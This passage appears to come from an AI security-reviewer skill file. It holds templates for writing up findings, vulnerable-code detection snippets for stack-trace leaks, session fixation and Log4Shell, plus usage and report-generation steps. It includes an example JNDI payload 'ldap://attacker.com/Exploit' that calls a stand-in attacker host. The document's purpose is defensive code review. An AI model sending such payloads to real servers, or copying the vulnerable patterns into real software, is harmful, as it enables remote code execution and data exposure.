| **AUTH-NNN Findings** | Dedicated finding format + Appendix D inventory table |
| **Burp Suite PoCs** | Raw HTTP requests per finding for Repeater/Intruder; prerequisites + expected indicators |
| **HTML Report Export** | Styled dark-theme HTML via `scripts/generate_html_report.py` — mandatory deliverable |
| **Graphify-First Discovery** | `query` / `path` / `explain` / `affected` with `--budget` before Read/Grep — cuts exploration tokens |
| **Natural Language Descriptions** | Checkmarx-style explanations describing what, where, how, and impact |
| **Full Stack Traces** | Complete source→sink data flow with every intermediate step |
| **Best Fix Location** | Identifies optimal point to fix (like Checkmarx BFL) |
| **Attack Vectors** | Real exploit examples for each vulnerability |
| **Impact Matrix** | CIA triad assessment with business impact |
| **Defense in Depth** | Multiple remediation approaches |
| **Before/After Code** | Complete code fixes with context |

---

---

## Additional Vulnerability Classes (from llm-sast-scanner)

### Stack Trace Leaking (CWE-209) - Information Disclosure

**Description Pattern:**
```
The method [METHOD] exposes internal stack trace information to users at line [LINE] 
of [FILE]. When an exception occurs, the full stack trace including file paths, 
class names, method signatures, and framework versions is returned in the HTTP 
response. This information disclosure enables attackers to map the internal 
architecture, identify framework versions with known CVEs, and craft targeted exploits.
```

**Detection Patterns:**
```python
# Python - VULNERABLE
return str(e)
return traceback.format_exc()
return {"error": repr(e), "trace": traceback.format_exc()}
app.run(debug=True)  # Flask debug mode
DEBUG = True         # Django debug mode
```

```javascript
// JavaScript - VULNERABLE
res.json({ error: err.stack });
res.json({ error: err.message });
res.json(err);  // Entire error object
```

```java
// Java - VULNERABLE
response.getWriter().println(e.getMessage());
e.printStackTrace(response.getWriter());
```

```php
// PHP - VULNERABLE
ini_set('display_errors', 1);
echo $e->getTraceAsString();
```

---

### Trust Boundary Violation (CWE-501)

**Description Pattern:**
```
The method [METHOD] stores untrusted HTTP request data directly into the server-side 
session at line [LINE] of [FILE]. The value from [SOURCE] is assigned to session 
attribute '[ATTR]' without validation. This allows attackers to manipulate session-bound 
data, potentially escalating privileges or bypassing access controls.
```

**Detection:**
```java
// VULNERABLE
session.setAttribute("role", request.getParameter("role"));
session.setAttribute("userId", request.getHeader("X-User-Id"));
```

---

### HTTP Request Smuggling (CWE-444)

**Description Pattern:**
```
The application architecture includes a frontend proxy ([PROXY]) forwarding to backend 
server ([BACKEND]) without proper Content-Length/Transfer-Encoding normalization. This 
configuration at [CONFIG_FILE] line [LINE] allows request smuggling attacks where 
attackers can bypass security controls, poison caches, or hijack other users' requests.
```

---

### JNDI Injection / Log4Shell (CWE-917)

**Description Pattern:**
```
The method [METHOD] passes user-controlled input to a JNDI lookup operation at line 
[LINE] of [FILE]. The input from [SOURCE] reaches InitialContext.lookup() / Log4j 
logging without sanitization. An attacker can inject JNDI URLs like 
'ldap://attacker.com/Exploit' to load malicious classes, resulting in Remote Code 
Execution on the server.
```

**Detection:**
```java
// Direct JNDI - VULNERABLE
ctx.lookup(request.getParameter("ds"));

// Log4Shell - VULNERABLE (Log4j < 2.17.0)
logger.info("User-Agent: {}", request.getHeader("User-Agent"));
```

---

### Session Fixation (CWE-384)

**Description Pattern:**
```
The method [METHOD] authenticates users without regenerating the session ID at line 
[LINE] of [FILE]. After successful authentication, the pre-authentication session ID 
remains valid, allowing attackers who know or set this ID to hijack the authenticated 
session and gain full access to the victim's account.
```

**Detection:**
```java
// VULNERABLE - No session.invalidate() or changeSessionId()
session.setAttribute("user", authenticatedUser);
```

---

### Denial of Service Patterns

#### ReDoS (CWE-1333)
```
The method [METHOD] applies a regular expression with catastrophic backtracking 
potential to user-controlled input at line [LINE] of [FILE]. The regex pattern 
'[PATTERN]' contains [nested quantifiers/overlapping alternation] that causes 
exponential time complexity. An attacker can supply crafted input to freeze the 
server thread for extended periods.
```

#### XML Bomb (CWE-776)
```
The method [METHOD] parses XML from untrusted sources without disabling entity 
expansion at line [LINE] of [FILE]. An attacker can send a "Billion Laughs" payload 
that expands recursively, consuming all available memory and causing denial of service.
```

#### Zip Bomb (CWE-409)
```
The method [METHOD] extracts compressed archives without validating the uncompressed 
size at line [LINE] of [FILE]. An attacker can upload a small zip file (e.g., 42KB) 
that expands to petabytes of data, exhausting disk space and memory.
```

---

## Extended References

| File | Contents |
|------|----------|
| `references/frontend-stacktrace-leaks.md` | SAST-LEAK-01…08 — stacks/errors to frontend |
| `references/secrets-patterns.md` | SAST-SECRET-01…11 — keys/passwords/tokens |
| `references/injection-deep-scan.md` | XSS, RCE, CMD, XXE, XML injection |
| `references/burp-host-discovery.md` | Code-derived Burp targets (no localhost) |
| `scripts/discover_burp_hosts.sh` | Extract hosts from config → `burp_hosts.txt` |
| `references/opengrep-vulnerability-index.md` | OpenGrep `vulnerability_class` → `SAST-OG-*` mapping |
| `references/sast_scan_manifest.md` | Full agent-native SAST checks (28 OpenGrep classes) |
| `references/coverage-checklist.md` | Appendix E matrix |
| `scripts/run_sast_scan.sh` | Deterministic rg runner (OpenGrep taxonomy) |
| `references/route_auth_audit.md` | Unauthenticated endpoint detection, Burp MCP verification, Appendix D |
| `references/patterns.md` | Static regex signatures (use on graphify-scoped paths only) |
| `references/burp_poc_templates.md` | Burp Repeater/Intruder HTTP templates by vulnerability class |
| `references/additional_vulns.md` | Stack trace leak, JNDI, session fixation, DoS, etc. |
| `scripts/generate_html_report.py` | Markdown → styled HTML report generator |

---

## Usage

```
# Standard review (Graphify-first + route auth audit)
Review this code for security vulnerabilities

# Build graph first if missing
/graphify .
# then review

# Full audit with unauthenticated endpoint check + Burp verification + HTML
Run comprehensive security audit, check unauthenticated endpoints, verify with Burp MCP if available, generate security_report.html

# With specific focus
Check for SQL injection and XSS in the API controllers

# Check for stack trace leaking
Check for information disclosure and stack trace exposure

# Full audit with PDF (optional)
Run comprehensive security audit and generate PDF report
```

**Direct execution only:** Run this entire workflow yourself. Do **not** delegate to subagents.

---

## HTML Report Generation (MANDATORY — end of every review)

1. Complete **`security_report.md`** with all TRUE POSITIVE findings (including Burp PoC sections).
2. Run:

```bash
python ~/.cursor/skills/ai-security-reviewer/scripts/generate_html_report.py security_report.md \
  -o security_report.html \
  --project "Project Name"
```

3. Confirm output path to the user. The HTML includes severity badges, tables, code/Burp blocks, and print-friendly CSS.

**If Python is unavailable:** emit a single self-contained `security_report.html` with inline CSS using the same section order as the markdown report.

---

## PDF Generation (optional)

After review, generate PDF:

```bash
python generate_pdf.py security_report.md output.pdf "Project Name"
```

Or ask: "Generate PDF report"
